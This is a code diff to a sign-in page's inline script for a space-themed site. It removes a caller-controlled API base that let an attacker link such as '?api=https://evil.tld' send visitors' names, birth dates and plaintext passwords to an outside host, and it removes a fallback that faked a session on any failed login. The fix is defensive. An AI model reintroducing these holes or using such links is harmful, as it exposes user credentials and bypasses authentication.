@@ -676,14 +676,11 @@
   <script>
     (function () {
       function resolveSpaceApi() {
-        try {
-          var q = new URLSearchParams(window.location.search).get('api');
-          if (q) return String(q).replace(/\/$/, '');
-        } catch (e) {}
-        var m = document.querySelector('meta[name="space-api"]');
-        var mc = m && m.content != null ? String(m.content).trim() : '';
-        if (mc) return mc.replace(/\/$/, '');
-        // Vite (npm run dev): bir xil origin + /api/v1 → proxy orqali Django (CORS muammosiz)
+        // SECURITY: the API base is same-origin only. This used to honour a
+        // ?api= query parameter and a <meta name="space-api"> override, so a
+        // link like /cosmic-silk-road.html?api=https://evil.tld posted the
+        // visitor's name, date of birth and plaintext password to that host
+        // from the real domain. Never reintroduce a caller-controlled base.
         if (window.location.protocol === 'http:' || window.location.protocol === 'https:') {
           return window.location.origin.replace(/\/$/, '') + '/api/v1';
         }
@@ -954,28 +951,9 @@
         return fallback;
       }
 
-      function localSessionFromEmail(email) {
-        var handle = (email.split('@')[0] || 'cadet').replace(/[^a-zA-Z0-9_]/g, '') || 'cadet';
-        var title = handle.charAt(0).toUpperCase() + handle.slice(1);
-        var hint = null;
-        try {
-          hint = JSON.parse(localStorage.getItem('space-profile-hint') || 'null');
-        } catch (e) {}
-        var first = hint && hint.email === email ? (hint.first_name || title) : title;
-        var last = hint && hint.email === email ? (hint.last_name || '') : '';
-        var astronaut = (first + ' ' + last).trim() || title;
-        return {
-          user: {
-            username: handle,
-            email: email,
-            first_name: first,
-            last_name: last,
-            astronaut_name: astronaut,
-          },
-          access: 'local_access_' + Date.now(),
-          refresh: 'local_refresh_' + Date.now(),
-        };
-      }
+      // localSessionFromEmail() removed: it minted a fake session
+      // ({access: 'local_access_<timestamp>'}) so a wrong password still
+      // looked like a successful login and redirected into the site.
 
       signinForm.addEventListener('submit', function (e) {
         e.preventDefault();
@@ -1002,8 +980,16 @@
           .then(parseFetchResponse)
           .then(function (o) {
             if (signinBtn) signinBtn.disabled = false;
-            var session = (o.res.ok && o.j && o.j.access) ? o.j : localSessionFromEmail(em);
-            persistAuth(session);
+            // SECURITY: only a real access token counts as a session. This used
+            // to fall back to localSessionFromEmail(em) on any non-ok response
+            // and again in .catch(), so every wrong password produced
+            // 'Muvaffaqiyat!' and a redirect into the site.
+            if (!(o.res.ok && o.j && o.j.access)) {
+              signinStatus.textContent = (o.j && o.j.detail) || 'Email yoki parol notoʻgʻri.';
+              signinStatus.style.color = '#f5a29a';
+              return;
+            }
+            persistAuth(o.j);
             signinStatus.textContent = 'Muvaffaqiyat! Raketa uchmoqda…';
             signinStatus.style.color = '#96f5be';
             playLaunchAnimation(function () {
@@ -1012,12 +998,8 @@
           })
           .catch(function () {
             if (signinBtn) signinBtn.disabled = false;
-            persistAuth(localSessionFromEmail(em));
-            signinStatus.textContent = 'Muvaffaqiyat! Raketa uchmoqda…';
-            signinStatus.style.color = '#96f5be';
-            playLaunchAnimation(function () {
-              goToSite();
-            });
+            signinStatus.textContent = 'Serverga ulanib boʻlmadi. Keyinroq urinib koʻring.';
+            signinStatus.style.color = '#f5a29a';
           });
       });
 
